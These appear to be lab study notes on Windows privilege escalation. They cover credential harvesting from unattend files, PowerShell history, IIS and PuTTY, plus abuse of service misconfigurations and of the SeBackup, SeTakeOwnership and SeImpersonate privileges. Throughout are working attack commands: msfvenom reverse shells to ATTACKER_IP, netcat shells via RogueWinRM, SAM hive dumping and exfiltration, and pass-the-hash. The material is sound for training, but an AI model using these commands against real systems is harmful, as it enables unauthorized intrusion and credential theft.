---
description: Shattered Windows
---

# Windows Escalation

There will be situations where to escalate into other unprivileged accounts before gaining administrative privileges.

* Misconfiguration on Windows services or scheduled tasks.
* Excessive privileges assigned to an account.
* Vulnerable software.
* Missing Windows security patches.

## Windows Users

Windows systems mainly have two kinds of users. Depending on their access levels, we can categorize a user in one of the following groups:

| Accounts           | Description                                                                                                                                                 |
| ------------------ | ----------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Administrators** | Have the most privileges - Ability to change any system configuration parameter and access any file in the system.                                          |
| **Standard Users** | Can access the computer but only perform limited tasks. Typically can not make permanent or essential changes to the system and are limited to their files. |

There are some special built-in accounts used by the operating system in the context of privilege escalation:

| Built-in Accounts      | Description                                                                                                                                                                  |
| ---------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **SYSTEM/LocalSystem** | Used by the operating system to perform internal tasks. It has full access to all files and resources available on the host with even higher privileges than administrators. |
| **Local Service**      | Default account used to run Windows services with 'minimum' privileges. It will use anonymous connections over the network.                                                  |
| **Network Service**    | Default account used to run Windows services with 'minimum' privileges and use the computer credentials to authenticate through the network.                                 |

These accounts are created and managed by Windows, and will not be able to use them as regular accounts. In some situations, it is possible to gain their privileges due to exploiting specific services.

## Harvest Passwords

The easiest way to gain access to another user is to gather credentials from a compromised machine. Such credentials could exist for many reasons, including a careless user leaving them around in plain-text files; or even stored by some software like browsers or email clients.

### Unattended Windows Installation

When installing Windows on a large number of hosts, administrators may use Windows Deployment Services, which allows for a single operating system image to be deployed through the network. They are considered unattended installations as they do not require user interaction to install. Such installations require the use of an administrator account to perform the initial setup, which might end up being stored in the machine in the following locations:

* C:\Unattend.xml
* C:\Windows\Panther\Unattend.xml
* C:\Windows\Panther\Unattend\Unattend.xml
* C:\Windows\system32\sysprep.inf
* C:\Windows\system32\sysprep\sysprep.xml

### PowerShell History

When a user runs a command using PowerShell, it gets stored into a file that keeps a memory of past passwords. This is useful for repeating commands you have used before quickly. It can later be retrieved by using the following command from a `cmd.exe` prompt:

```shell
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

The command above will only work from cmd.exe, as PowerShell will not recognize `%userprofile%` as an environment variable. To read the file from PowerShell, you have to replace `%userprofile%` with `$Env:userprofile`.

### Saved Windows Credentials

Windows allows us to use other users' credentials. This function also gives the option to save these credentials on the system:

`cmdkey /list`

While unable to see the actual passwords, any credentials are worth trying with the `runas` command and the `/savecred` option.

`runas /savecred /user:admin cmd.exe`

### IIS Configuration

Internet Information Services (IIS) is the default web server on Windows installations. The configuration of websites on IIS is stored in a file called `web.config` and can store passwords for databases or configured authentication. Depending on the installed version of IIS, we can find the .config in one of the following locations:

* C:\inetpub\wwwroot\web.config
* C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config

An example to find database connection strings on the file:

```powershell
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
```

### Credentials from Software: PuTTY

PuTTY is an SSH client commonly found on Windows systems. Users can store sessions where the IP, user and other configurations can be stored for later use. While PuTTY will not allow users to store their SSH password, it will store proxy configurations that include clear-text authentication credentials.

To retrieve the stored proxy credentials, search under the following registry key for ProxyPassword with the following command:

```powershell
reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
```

**Note:** Simon Tatham is the creator of PuTTY and his name is part of the path, not the username we are retrieving the password. The stored proxy username should be visible after running the command above.

Just as PuTTY stores credentials, any software that stores passwords, including browsers, email clients, FTP clients, SSH clients, VNC software and others, will have methods to recover any passwords the user has saved.\


### Other Easy Access

Privilege escalation is not always a challenge. Some misconfiguations can allow to obtain high privileged user, and even administrator access.

#### Scheduled Tasks

Scheduled tasks can be listed from the command line using the `schtasks` command without any options. Sometimes a scheduled task lost its binary or is using a binary that can be modified.

* "Task to Run" parameter indicates what gets executed by the scheduled task and "Run as User" parameter, shows the user that will be used to execute the task.
* If the current user can modify or overwrite the "Task to Run" executable, we can control what gets executed by the user, resulting in a simple privilege escalation. To check the file permissions on the executable, use `icacls`
* Can modify the .bat file and insert any payload to spawn a reverse shell.

#### AlwaysInstallElevated

Windows installer files (also known as .msi files) are used to install applications on the system. They run with the privilege level of the user that starts it. However, these can be configured to run with higher privileges from any user account. This could potentially allow to generate a malicious MSI file that would run with admin privileges.

Requires two registry values to be set:

<pre class="language-shell"><code class="lang-shell"><strong>reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
</strong>reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer</code></pre>

If these are set, generate a malicious .msi file using `msfvenom`, as seen below:

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_MACHINE_IP LPORT=LOCAL_PORT -f msi -o malicious.msi
```

## Abusing Service Misconfigurations

Windows services are managed by the **Service Control Manager (SCM)**. The SCM is a process in charge of managing the state of services as needed, checking the current status of any given service and generally providing a way to configure services.

Each service on a Windows machine will have an executable which will be run by the SCM when a service is started. The service executable implement special functions to be able to communicate with the SCM, and not any executable can be started as a service successfully.

Use the `sc qc` command to a view service configuration.

* **BINARY\_PATH\_NAME** parameter shows the associated executable.
* **SERVICE\_START\_NAME** displays the account used to run the service.

Services have a Discretionary Access Control List (DACL), which indicates who has permission to start, stop, pause, query status, query configuration, or reconfigure the service, amongst other privileges.

All the services configurations are stored on the registry under `HKLM\SYSTEM\CurrentControlSet\Services\`

A sub-key exists for every service in the system. There is **ImagePath** value and the account used to start the service on the **ObjectName** value. If a DACL has been configured for the service, it will be stored in a sub-key called **Security**.

### Insecure Permissions on Service Executable

If the executable associated with a service has weak permissions that allow an attacker to modify or replace it, the attacker can gain the privileges of the service's account. Use `sc` to query the service configuration.

* Check the permissions of the service executable with `icacls EXECUTABLE`. The Everyone group has modify permissions (M) on the service's executable.
* Overwrite the executable with any payload of preference, and the service will execute it with the privileges of the configured user account.
* Generate an exe-service payload using msfvenom and serve through a python web-server.
  * `msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4445 -f exe-service -o rev-svc.exe`
  * Utilize powershell to download the payload: `wget http://ATTACKER_IP:8000/rev-svc.exe -O rev-svc.exe`
  *   Once the payload is on the Windows server:&#x20;

      ```powershell
      C:\> cd C:\PROGRA~2\SYSTEM~1\

      C:\PROGRA~2\SYSTEM~1> move WService.exe WService.exe.bkp
              1 file(s) moved.

      C:\PROGRA~2\SYSTEM~1> move C:\Users\thm-unpriv\rev-svc.exe WService.exe
              1 file(s) moved.

      C:\PROGRA~2\SYSTEM~1> icacls WService.exe /grant Everyone:F
              Successfully processed 1 files.
      ```
* Grant full permissions to the new service executable payload and start a reverse listener shell on attacker machine.

### Unquoted Service Paths

When we can not directly write into service executables, there might be a chance to force a service into running arbitrary executables by using an obscure feature.

When working with Windows services, a particular behavior occurs when the service is configured to point to an "unquoted" executable.

* Unquoted means the path of the associated executable is not properly quoted to account for spaces on the command.
*   Proper quotation for path name:&#x20;

    ```shell-session
    BINARY_PATH_NAME   : "C:\Program Files\RealVNC\VNC Server\vncserver.exe" -service
    ```
*   Without proper quotation:

    ```shell-session
    BINARY_PATH_NAME   : C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe
    ```

Since there are spaces on the name of the "Disk Sorter Enterprise" folder, the command becomes ambiguous, and the SCM does not know which of the following trying to execute:

| Command                                              | Argument 1                 | Argument 2                 |
| ---------------------------------------------------- | -------------------------- | -------------------------- |
| C:\MyPrograms\Disk.exe                               | Sorter                     | Enterprise\bin\disksrs.exe |
| C:\MyPrograms\Disk Sorter.exe                        | Enterprise\bin\disksrs.exe |                            |
| C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe |                            |                            |

Most of the service executables will be installed under `C:\Program Files` or `C:\Program Files (x86)` by default, which isn't writable by unprivileged users. Some exceptions are when installers change the permissions on the installed folders, making the services vulnerable.

* In this case, the Disk Sorter binaries are under `C:\MyPrograms` and inherits the permissions of the `C:\` directory. Verify with `icacls` that the users group has AD and WD privileges allowing the user to create sub-directories and files.
* Generate a payload reverse shell and send through python server similar to the previous task and overwrite Disk.exe

### Insecure Service Permissions

The service DACL (not the service's executable DACL) allow to modify the configuration of a service, and then reconfigure the service. This will allow to point to any executable need to run with any account, including SYSTEM.

To check for a service DACL from the command line, use [Accesschk](https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk) from the Sysinternals suite.

* The BUILTIN\\\Users group has the `SERVICE_ALL_ACCESS` permission, meaning any user can reconfigure the service.
* Create another reverse shell executable payload to the target machine and grant permissions to Everyone.
*   To change the service's associated executable and account:

    ```shell-session
    sc config THMService binPath= "C:\Users\thm-unpriv\rev-svc3.exe" obj=LocalSystem
    ```

    * LocalSystem is the highest privileged account available.

## Abusing Dangerous Privileges

Privileges are rights than an account has to perform specific system-related tasks. Each user has a set of assigned privileges that can be checked with the following command: `whoami /priv`

A complete list of available privileges on Windows systems is available [here](https://learn.microsoft.com/en-us/windows/win32/secauthz/privilege-constants). From an attacker's view, only those privileges that allow to escalate in the system are of interest. A list of exploitable privileges on the [Priv2Admin](https://github.com/gtworek/Priv2Admin) GitHub project. Here are most common privileges to abuse:

### SeBackup / SeRestore

The SeBackup and SeRestore privileges allow users to read and write to any file in the sytem, ignoring any DACL in place.

* `whoami /priv` to check privileges for the user.
* Backup the SAM and SYSTEM hashes with `reg save hklm\system C:\Users\THMBackup\systemhive` and `reg save hklm\sam C:\Users\THMBackup\sam.hive`
  * This will create files with the registry hives content to copy files to our attacker machine using SMB or any other available method. For SMB, use smbserver.py to start a simple SMB server with a network share in the current directory.
* ```bash
  mkdir share
  python3.9 /opt/impacket/examples/smbserver.py -smb2support -username THMBackup -password CopyMaster555 public share
  ```
  * This will create a share named _public_ pointing to the share directory, which requires the username and password of our current windows session, then copy command to transfer files.
*   Use the impacket to retrieve the users' password hashes:&#x20;

    ```bash
    python3.9 /opt/impacket/examples/secretsdump.py -sam sam.hive -system system.hive LOCAL
    ```
* Finally use the Administrator's hash to perform Pass-the-Hash attack and gain access to the target machine with SYSTEM privileges. `python3.9 /opt/impacket/examples/psexec.py -hashes`

### SeTakeOwnership

The SeTakeOwnership privilege allows a user to take ownership of any object on the system, including files and registry keys, opening possibilities to elevate privileges. For example, it is possible to search for a service running as SYSTEM and take ownership of the service's executable.

To gain SeTakeOwner, open the command prompt using "Open as adminstrator" and input password to get an elevated console.

* Check privileges with the command `whoami /priv`
* We will use utilman, which is a built-in Windows application used to provide Ease of Access options during the lock screen.
  * Utilman is run with SYSTEM privileges and will replace the original binary for any payload.

To replace utilman, start by taking ownership with the following command:&#x20;

```shell-session
takeown /f C:\Windows\System32\Utilman.exe
```

Being the owner of a file does not necessarily mean having privileges over it, but allows the owner to assign any privileges for full permissions.

```shell-session
icacls C:\Windows\System32\Utilman.exe /grant THMTakeOwnership:F
```

Replace `utilman.exe` with a copy of cmd.exe

```shell-session
copy cmd.exe utilman.exe
```

To trigger utilman, lock screen from the start button and click on the "Ease of Access" button, which runs with SYSTEM privileges.

### SeImpersonate / SeAssignPrimaryToken

These privileges allow a process to impersonate other users and act on their behalf. Impersonation consists of being able to spawn a process or thread under the security context of another user.

Assume FTP service is running with user _ftp._ If user Ann logs into the FTP server and tries to access her files, the FTP service would try to access them with its access token rather than Ann's:

<figure><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/006115497113a0a4f03008028dc32fb7.png" alt=""><figcaption></figcaption></figure>

In the image above, the FTP service would be able to access Ann's files since the ftp user has impersonation privileges, but not Bill's files, as the DACL in Bill's files does not allow user _ftp_. For the operating, all files are accessed by user ftp, independent of which user is currently logged in to the FTP service. This makes it impossible to delegate the authorization to the operating system; therefore the FTP service must implement it. If the FTP service were compromised, the attacker would immediately gain access to all of the folders to which the _ftp_ user has access.

If the FTP service's user has the SeImpersonate or SeAssignPrimaryToken privilege, in simple terms, the FTP service can temporarily grab the access token of the user logging in and use it to perform any task on their behalf.

<figure><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/c25de66ae7777169d09a61ce2fb38e28.png" alt=""><figcaption></figcaption></figure>

If user Ann logs in to the FTP service and given the ftp user has impersonation privileges, it can borrow Ann's access token and use it to access her files.

* Files do not need to provide access to the user _ftp_, and the operating system handles authorization. Since the FTP service is impersonating Ann, it will not be able to access Jude's or Bill's files during that session.

As attackers, if managed to take control of a process with SeImpersonate or SeAssignPrimaryToken privileges, they can impersonate any user connecting and authenticating to that process.

In Windows systems, the LOCAL SERVICE and NETWORK SERVICE ACCOUNTS already have such privileges. Since these accounts are used to spawn services using restricted accounts, it makes sense to allow them to impersonate connecting users if the service needs. To elevate privileges, the attacker needs the following:

1. Spawn a process that users can connect and authenticate to for impersonation to occur.
2. Find a way to force privileged users to connect and authenticate to the spawn malicious process.

In this example, use RogueWinRM exploit to accomplish both conditions. To use RogueWinRM, first upload the exploit to the target machine.

* The RogueWinRM exploit is possible because when a user (including unprivileged users) starts the BITS service in Windows, it automatically creates a connection to port 5985 using SYSTEM privileges. Port 5985 is normally used for WinRM service, that exposes a Powershell console to be used remotely through the network - like SSH, but using Powershell.
* Before running the exploit, start a netcat listener to receive a reverse shell on the attacker's machine.
  *   To exploit, trigger RogueWinRM with the web shell using the command:

      ```shell-session
      c:\tools\RogueWinRM\RogueWinRM.exe -p "C:\tools\nc64.exe" -a "-e cmd.exe ATTACKER_IP 4442"
      ```

The exploit may take up to 2 minutes to work so the browser may seem unresponsive.&#x20;

* The `-p` parameter specifies the executable to be run by the exploit, which is `nc64.exe` in this case.
* `-a` parameter is used to pass arguments to the executable. To establish a reverse shell, the arguments to pass to netcat will be `-e cmd.exe ATTACKER_IP 4442` &#x20;

## Abusing Vulnerable Software

Software installed on the target system can present various privilege escalation opportunities. Use the `wmic` tool to list software installed on the target system and its versions.

```shell-session
wmic product get name,version,vendor
```

The command may not return all installed programs. Depending on how some programs were installed, they may not be listed and always worth to check desktop shortcuts, available services or any trace that indicates existence of additional software to be vulnerable.

* Gather product version information to search for existing exploits installed on the software on sites like  [exploit-db](https://www.exploit-db.com/), [packet storm](https://packetstormsecurity.com/) or [Google](https://www.google.com/).

## Automated Tools

Below are automated tools to enumerate over potential privilege escalation vectors. However, automated tools can sometimes miss privilege escalation.

### WinPEAS

WinPEAS can be downloaded [here](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS).

### PrivescCheck

A PowerShell script alternative to WinPEAS without requiring the execution of a binary file to search common privilege escalation on the target system. PrivescCheck can be downloaded [here](https://github.com/itm4n/PrivescCheck).

### WES-NG: Windows Exploit Suggester - Next Generation

WES-NG is a Python script that can be downloaded [here](https://github.com/bitsadmin/wesng).

* Avoids making unnecessary noise that can attract attention to antivirus software and runs on the attacking machine.

### Metasploit

If already have a Meterpreter shell on the target system, use `multi/recon/local_exploit_suggester` module to list vulnerabilities that may affect the target system.
